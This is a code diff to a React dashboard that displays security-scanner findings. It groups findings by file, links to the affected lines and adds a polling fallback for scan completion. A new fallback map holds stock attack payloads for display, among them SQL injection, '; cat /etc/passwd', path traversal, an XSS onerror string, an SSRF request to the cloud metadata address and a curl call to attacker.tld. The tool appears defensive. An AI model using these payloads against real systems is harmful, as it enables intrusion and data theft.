@@ -62,6 +62,7 @@ const TYPE_TO_CATEGORY = {
 };
 
 const PLACEHOLDER_TEXT_RE = /requires\s+logn|requires\s+login|unknown\s+vulnerability|security\s+issue|no\s+description\s+available/i;
+const PLACEHOLDER_PAYLOAD_RE = /^(?:<[^>]*payload[^>]*>|attacker_payload|malicious_payload|malicious_data|user_input|input)$/i;
 
 const normalizeType = (vuln) => {
   const rawType = String(vuln?.type || '').trim();
@@ -86,16 +87,85 @@ const normalizeCategory = (vuln, normalizedType) => {
 };
 
 const normalizeText = (raw, fallback) => {
-  const value = String(raw || '').trim();
+  const value = String(raw || '').replace(/\\n/g, '\n').trim();
   if (!value || PLACEHOLDER_TEXT_RE.test(value)) return fallback;
   return value;
 };
 
 const normalizeCodeSnippet = (raw) => {
-  const value = String(raw || '').trim();
+  const value = String(raw || '').replace(/\\n/g, '\n').trim();
   if (!value) return '';
   if (/^requires\s+log(?:in|n)$/i.test(value)) return '';
   return value;
+};
+
+const normalizePayload = (raw) => {
+  if (raw === null || raw === undefined) return '';
+  if (typeof raw === 'string') return raw.replace(/\\n/g, '\n').trim();
+  try {
+    return JSON.stringify(raw, null, 2);
+  } catch {
+    return String(raw);
+  }
+};
+
+const inferMaliciousPayload = (vuln) => {
+  const type = normalizeType(vuln);
+  const map = {
+    'SQL Injection': "' OR 1=1 --",
+    'Command Injection': '; cat /etc/passwd',
+    'Path Traversal': '../../etc/passwd',
+    'XSS': '<img src=x onerror=alert(1)>',
+    'SSRF': 'http://169.254.169.254/latest/meta-data/',
+    'IDOR / Broken Access Control': 'invoice_id=10002',
+    'Insecure Deserialization': '{"$type":"System.Windows.Data.ObjectDataProvider"}',
+    'Hardcoded Secret': 'AKIAIOSFODNN7EXAMPLE',
+    'Cryptographic Failure': '0000000000000000',
+    'Security Misconfiguration': 'github.event.issue.title && curl http://attacker.tld/pwn',
+    'Business Logic Flaw': 'quantity=-1000',
+  };
+  return map[type] || '" OR "1"="1';
+};
+
+const getEffectivePayload = (vuln) => {
+  const payload = normalizePayload(vuln?.malicious_payload);
+  if (!payload || PLACEHOLDER_PAYLOAD_RE.test(payload)) {
+    return inferMaliciousPayload(vuln);
+  }
+  return payload;
+};
+
+const normalizePayloadFlow = (vuln) => {
+  const raw = String(vuln?.exploit_explanation || '').replace(/\\n/g, '\n');
+  const cleaned = raw
+    .replace(/(?:\*\*)?Exact Affected Lines:(?:\*\*)?\s*`?\[[^\]]*\]`?/gi, '')
+    .replace(/\s{2,}/g, ' ')
+    .trim();
+
+  if (cleaned && !PLACEHOLDER_TEXT_RE.test(cleaned)) {
+    return cleaned;
+  }
+
+  const parameter = String(vuln?.vulnerable_parameter || 'user_input').trim();
+  const payload = getEffectivePayload(vuln);
+  return `Attacker controls ${parameter} and supplies ${payload}. This value reaches the vulnerable sink without strict validation, so it is interpreted as executable syntax instead of inert data.`;
+};
+
+const buildGithubLineUrl = (repoFullName, branch, filePath, lineNumber) => {
+  if (!repoFullName || !filePath) return '';
+  const cleanFile = String(filePath).replace(/^\/+/, '');
+  const safeBranch = branch || 'main';
+  const linePart = lineNumber ? `#L${lineNumber}` : '';
+  return `https://github.com/${repoFullName}/blob/${safeBranch}/${cleanFile}${linePart}`;
+};
+
+const buildInjectedExample = (vuln) => {
+  const explicit = String(vuln?.exploit_injected_example || '').trim();
+  if (explicit) return explicit;
+  const fn = String(vuln?.title || vuln?.function_name || 'vulnerableFunction').replace(/\s+/g, '');
+  const param = String(vuln?.vulnerable_parameter || 'user_input');
+  const payload = getEffectivePayload(vuln);
+  return `${fn}(${param}=${payload})`;
 };
 
 const MARKDOWN_COMPONENTS = {
@@ -287,6 +357,7 @@ const RepositoryDetail = () => {
   const [commits, setCommits] = useState([]);
   const [selectedCommit, setSelectedCommit] = useState('');
   const [estimatedTimeRemaining, setEstimatedTimeRemaining] = useState(null);
+  const [activeScanId, setActiveScanId] = useState('');
   
   // State for file-based vulnerability viewer
   const [selectedFileVulns, setSelectedFileVulns] = useState(null);
@@ -364,6 +435,11 @@ const RepositoryDetail = () => {
     return vulnerabilities.map((vuln) => {
       const type = normalizeType(vuln);
       const category = normalizeCategory(vuln, type);
+      const payload = getEffectivePayload(vuln);
+      const lineLink = buildGithubLineUrl(repo?.full_name, selectedBranch, vuln.file_path, vuln.line_number);
+      const affectedLines = Array.isArray(vuln.all_affected_lines)
+        ? [...new Set(vuln.all_affected_lines.map((n) => Number(n)).filter((n) => Number.isInteger(n) && n > 0))].sort((a, b) => a - b)
+        : (vuln.line_number ? [Number(vuln.line_number)] : []);
       return {
         ...vuln,
         type,
@@ -378,15 +454,57 @@ const RepositoryDetail = () => {
           `Tagged as ${type} based on rule match and code context.`
         ),
         code_snippet: normalizeCodeSnippet(vuln.code_snippet),
+        vulnerable_parameter: String(vuln.vulnerable_parameter || '').trim(),
+        malicious_payload: payload,
+        exploit_explanation: normalizePayloadFlow(vuln),
+        exploit_injected_example: String(buildInjectedExample(vuln) || '').replace(/\\n/g, '\n').trim(),
+        impact_summary: normalizeText(
+          vuln.impact_summary,
+          `This ${type} issue may leak sensitive data, allow unauthorized modification/deletion, or degrade service availability.`
+        ),
+        affected_line_link: lineLink,
+        all_affected_lines: affectedLines,
       };
     });
-  }, [vulnerabilities]);
+  }, [vulnerabilities, repo?.full_name, selectedBranch]);
 
-  const groupedVulnerabilities = useMemo(() => {
-    return UNIFIED_VULN_CATEGORIES.map((category) => ({
-      category,
-      items: normalizedVulnerabilities.filter((v) => v.category === category),
-    }));
+  const groupedByFileThenCategory = useMemo(() => {
+    const grouped = normalizedVulnerabilities.reduce((acc, vuln) => {
+      const file = vuln.file_path || 'unknown-file';
+      const category = vuln.category || 'Uncategorized';
+      if (!acc[file]) {
+        acc[file] = {};
+      }
+      if (!acc[file][category]) {
+        acc[file][category] = [];
+      }
+      acc[file][category].push(vuln);
+      return acc;
+    }, {});
+
+    return Object.keys(grouped)
+      .sort((a, b) => a.localeCompare(b))
+      .map((filePath) => {
+        const categories = Object.keys(grouped[filePath])
+          .sort((a, b) => {
+            const ai = UNIFIED_VULN_CATEGORIES.indexOf(a);
+            const bi = UNIFIED_VULN_CATEGORIES.indexOf(b);
+            if (ai === -1 && bi === -1) return a.localeCompare(b);
+            if (ai === -1) return 1;
+            if (bi === -1) return -1;
+            return ai - bi;
+          })
+          .map((category) => ({
+            category,
+            items: grouped[filePath][category],
+          }));
+
+        return {
+          filePath,
+          categories,
+          totalFindings: categories.reduce((sum, c) => sum + c.items.length, 0),
+        };
+      });
   }, [normalizedVulnerabilities]);
   
   // Handle file click in tree to show vulnerabilities
@@ -416,9 +534,13 @@ const RepositoryDetail = () => {
       if (restoreRunningScan) {
         const runningScan = scanData.find(s => s.status === 'running' || s.status === 'pending');
         if (runningScan) {
+          completionHandledRef.current = false;
+          setActiveScanId(runningScan.id || '');
           setScanning(true);
           setScanProgress(runningScan.progress || 50);
           setScanStage('Workflow running...');
+        } else {
+          setActiveScanId('');
         }
       }
     } catch (error) {
@@ -431,6 +553,34 @@ const RepositoryDetail = () => {
   // WebSocket ref for scan-specific connections
   const scanWsRef = useRef(null);
   const pingIntervalRef = useRef(null);
+  const completionHandledRef = useRef(false);
+
+  const finalizeScanCompletion = useCallback((message) => {
+    if (completionHandledRef.current) return;
+    completionHandledRef.current = true;
+
+    setScanProgress(85);
+    setScanStage('Results received');
+
+    setTimeout(() => {
+      setScanProgress(100);
+      setScanStage('Scan completed!');
+    }, 500);
+
+    setTimeout(() => {
+      setScanning(false);
+      setActiveScanId('');
+      setScanProgress(0);
+      setScanStage('');
+      setEstimatedTimeRemaining(null);
+      toast.success(message || 'Scan completed!');
+      fetchData(false);
+
+      if (scanWsRef.current) {
+        scanWsRef.current.close();
+      }
+    }, 2000);
+  }, [fetchData]);
   
   // Function to connect WebSocket for a specific scan
   const connectScanWebSocket = useCallback((scanId) => {
@@ -526,29 +676,17 @@ const RepositoryDetail = () => {
         
         // Scan complete (final)
         if (data.type === 'scan_complete') {
-          const notification = data.notification;
+          const notification = data.notification || {};
+          const notificationData = notification.data || {};
           
           // Check if this notification is for our current scan
-          if (notification.data?.repository_id === id || notification.data?.scan_id === scanId) {
-            setScanProgress(85);
-            setScanStage('Results received');
-            
-            setTimeout(() => {
-              setScanProgress(100);
-              setScanStage('Scan completed!');
-            }, 500);
-            
-            setTimeout(() => {
-              setScanning(false);
-              setScanProgress(0);
-              setScanStage('');
-              setEstimatedTimeRemaining(null);
-              toast.success(notification.message || 'Scan completed!');
-              fetchData(false); // Don't restore running scans after completion
-            }, 2000);
-            
-            // The backend will close the socket, but we clean up our refs
-            console.log(`Scan ${scanId} completed, cleaning up WebSocket`);
+          if (
+            notificationData.repository_id === id ||
+            notificationData.scan_id === scanId ||
+            data.scan_id === scanId
+          ) {
+            finalizeScanCompletion(notification.message || data.message || 'Scan completed!');
+            console.log(`Scan ${scanId} completed, processing final UI state`);
           }
         }
       } catch (error) {
@@ -568,7 +706,44 @@ const RepositoryDetail = () => {
     ws.onerror = (error) => {
       console.error(`WebSocket error for scan ${scanId}:`, error);
     };
-  }, [id, fetchData]);
+  }, [id, finalizeScanCompletion]);
+
+  // Reconnect scan-specific socket when restoring an in-progress scan.
+  useEffect(() => {
+    if (!scanning || !activeScanId) return;
+    if (scanWsRef.current && scanWsRef.current.readyState === WebSocket.OPEN) return;
+    connectScanWebSocket(activeScanId);
+  }, [scanning, activeScanId, connectScanWebSocket]);
+
+  // Poll as a fallback in case the final WebSocket event is missed.
+  useEffect(() => {
+    if (!scanning || !activeScanId) return;
+
+    const interval = setInterval(async () => {
+      try {
+        const latestScans = await api.getRepoScans(id).catch(() => []);
+        const active = (latestScans || []).find((s) => s.id === activeScanId);
+        if (!active) return;
+
+        if (active.status === 'completed') {
+          finalizeScanCompletion('Scan completed!');
+        } else if (active.status === 'failed') {
+          completionHandledRef.current = true;
+          setScanning(false);
+          setActiveScanId('');
+          setScanProgress(0);
+          setScanStage('');
+          setEstimatedTimeRemaining(null);
+          toast.error(active.error || active.error_message || 'Scan failed');
+          fetchData(false);
+        }
+      } catch {
+        // Ignore polling hiccups; WebSocket may still deliver completion.
+      }
+    }, 5000);
+
+    return () => clearInterval(interval);
+  }, [scanning, activeScanId, id, finalizeScanCompletion, fetchData]);
   
   // Cleanup WebSocket on unmount
   useEffect(() => {
@@ -645,6 +820,8 @@ const RepositoryDetail = () => {
       const result = await api.startGitHubScan(id, mode, selectedBranch, baseCommit);
       
       if (result.success) {
+        completionHandledRef.current = false;
+        setActiveScanId(result.scan_id || '');
         toast.success('Scan pipeline started!');
         setScanProgress(15);
         setScanStage('Wrapper hunter running...');
@@ -962,29 +1139,39 @@ const RepositoryDetail = () => {
                 </CardContent>
               </Card>
             ) : (
-              groupedVulnerabilities.map((group, groupIndex) => (
-                <Card key={group.category} className="border-border/60" data-testid={`vuln-group-${groupIndex}`}>
+              groupedByFileThenCategory.map((fileGroup, fileIndex) => (
+                <Card key={fileGroup.filePath} className="border-border/60" data-testid={`vuln-file-group-${fileIndex}`}>
                   <CardHeader className="pb-3">
-                    <div className="flex items-center justify-between">
-                      <CardTitle className="text-base">{group.category}</CardTitle>
-                      <Badge variant={group.items.length > 0 ? 'secondary' : 'outline'}>
-                        {group.items.length} finding{group.items.length !== 1 ? 's' : ''}
+                    <div className="flex items-center justify-between gap-3">
+                      <div>
+                        <CardTitle className="text-base">{fileGroup.filePath}</CardTitle>
+                        <CardDescription>File-wise grouped findings</CardDescription>
+                      </div>
+                      <Badge variant={fileGroup.totalFindings > 0 ? 'secondary' : 'outline'}>
+                        {fileGroup.totalFindings} finding{fileGroup.totalFindings !== 1 ? 's' : ''}
                       </Badge>
                     </div>
                   </CardHeader>
                   <CardContent>
-                    {group.items.length === 0 ? (
-                      <p className="text-sm text-muted-foreground">No findings in this category.</p>
-                    ) : (
-                      <div className="space-y-3">
-                        {group.items.map((vuln, index) => (
+                    <div className="space-y-4">
+                      {fileGroup.categories.map((group, groupIndex) => (
+                        <div key={`${fileGroup.filePath}-${group.category}`} className="rounded-md border border-border/50 p-3">
+                          <div className="flex items-center justify-between mb-3">
+                            <h4 className="text-sm font-semibold">{group.category}</h4>
+                            <Badge variant={group.items.length > 0 ? 'secondary' : 'outline'}>
+                              {group.items.length} finding{group.items.length !== 1 ? 's' : ''}
+                            </Badge>
+                          </div>
+
+                          <div className="space-y-3">
+                            {group.items.map((vuln, index) => (
                           <motion.div
-                            key={vuln.id || `${group.category}-${index}`}
+                            key={vuln.id || `${fileGroup.filePath}-${group.category}-${index}`}
                             initial={{ opacity: 0, y: 10 }}
                             animate={{ opacity: 1, y: 0 }}
-                            transition={{ delay: (groupIndex * 0.03) + (index * 0.02) }}
+                            transition={{ delay: (fileIndex * 0.02) + (groupIndex * 0.02) + (index * 0.01) }}
                           >
-                            <Card className="hover:border-primary/30 transition-all" data-testid={`vuln-${groupIndex}-${index}`}>
+                            <Card className="hover:border-primary/30 transition-all" data-testid={`vuln-${fileIndex}-${groupIndex}-${index}`}>
                               <CardHeader>
                                 <div className="flex items-start justify-between gap-3">
                                   <div>
@@ -1002,7 +1189,7 @@ const RepositoryDetail = () => {
                                 </div>
                               </CardHeader>
                               <CardContent>
-                                <div className="mb-3 rounded-md border border-border/60 bg-muted/20 px-3 py-3">
+                                <div className="mb-3 rounded-md border border-border/60 bg-background px-3 py-3">
                                   <ReactMarkdown components={MARKDOWN_COMPONENTS}>
                                     {vuln.description}
                                   </ReactMarkdown>
@@ -1010,11 +1197,63 @@ const RepositoryDetail = () => {
                                 {vuln.reason && vuln.reason !== vuln.description && (
                                   <p className="text-xs text-muted-foreground mb-3">AI Analysis: {vuln.reason}</p>
                                 )}
+
+                                <div className="mb-3 rounded-md border border-border/70 bg-background px-3 py-3">
+                                  <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">Affected Line</p>
+                                  {vuln.affected_line_link ? (
+                                    <a
+                                      href={vuln.affected_line_link}
+                                      target="_blank"
+                                      rel="noreferrer"
+                                      className="text-sm text-foreground underline decoration-foreground/40 hover:text-primary"
+                                    >
+                                      {vuln.file_path || 'unknown-file'}{vuln.line_number ? `:${vuln.line_number}` : ''}
+                                    </a>
+                                  ) : (
+                                    <p className="text-sm text-foreground">{vuln.file_path || 'unknown-file'}{vuln.line_number ? `:${vuln.line_number}` : ''}</p>
+                                  )}
+                                  {Array.isArray(vuln.all_affected_lines) && vuln.all_affected_lines.length > 0 && (
+                                    <p className="text-xs text-muted-foreground mt-2">
+                                      Exact Affected Lines: [ {vuln.all_affected_lines.join(', ')} ]
+                                    </p>
+                                  )}
+                                </div>
+
                                 {vuln.code_snippet && (
-                                  <pre className="bg-muted/50 border border-border/70 p-4 rounded-md text-xs font-mono overflow-x-auto mb-3">
+                                  <pre className="bg-slate-950 border border-slate-700 p-4 rounded-md text-xs font-mono overflow-x-auto mb-3 text-slate-100">
                                     <code>{vuln.code_snippet}</code>
                                   </pre>
                                 )}
+
+                                {(vuln.vulnerable_parameter || vuln.malicious_payload || vuln.exploit_injected_example || vuln.exploit_explanation || vuln.impact_summary) && (
+                                  <div className="space-y-3 mb-3">
+                                    <div className="rounded-md border border-border/70 bg-background px-3 py-3">
+                                      <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">Vulnerable Parameter</p>
+                                      <p className="text-sm text-foreground">{vuln.vulnerable_parameter || 'user_input'}</p>
+                                    </div>
+
+                                    <div className="rounded-md border border-border/70 bg-background px-3 py-3">
+                                      <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">Malicious Payload (raw)</p>
+                                      <pre className="bg-slate-950 border border-slate-700 p-3 rounded-md text-xs font-mono whitespace-pre-wrap break-words text-slate-100">{vuln.malicious_payload || '<attacker_payload>'}</pre>
+                                    </div>
+
+                                    <div className="rounded-md border border-border/70 bg-background px-3 py-3">
+                                      <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">Payload Inserted In Function</p>
+                                      <pre className="bg-slate-950 border border-slate-700 p-3 rounded-md text-xs font-mono whitespace-pre-wrap break-words text-slate-100">{vuln.exploit_injected_example}</pre>
+                                    </div>
+
+                                    <div className="rounded-md border border-border/70 bg-background px-3 py-3">
+                                      <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">How Payload Flows</p>
+                                      <p className="text-sm text-foreground">{vuln.exploit_explanation || vuln.reason}</p>
+                                    </div>
+
+                                    <div className="rounded-md border border-border/70 bg-background px-3 py-3">
+                                      <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">Data Loss / Leak Impact</p>
+                                      <p className="text-sm text-foreground">{vuln.impact_summary}</p>
+                                    </div>
+                                  </div>
+                                )}
+
                                 {vuln.ai_reasoning && (
                                   <div className="bg-primary/10 border border-primary/20 p-3 rounded-md">
                                     <p className="text-sm">
@@ -1031,9 +1270,11 @@ const RepositoryDetail = () => {
                               </CardContent>
                             </Card>
                           </motion.div>
-                        ))}
-                      </div>
-                    )}
+                            ))}
+                          </div>
+                        </div>
+                      ))}
+                    </div>
                   </CardContent>
                 </Card>
               ))
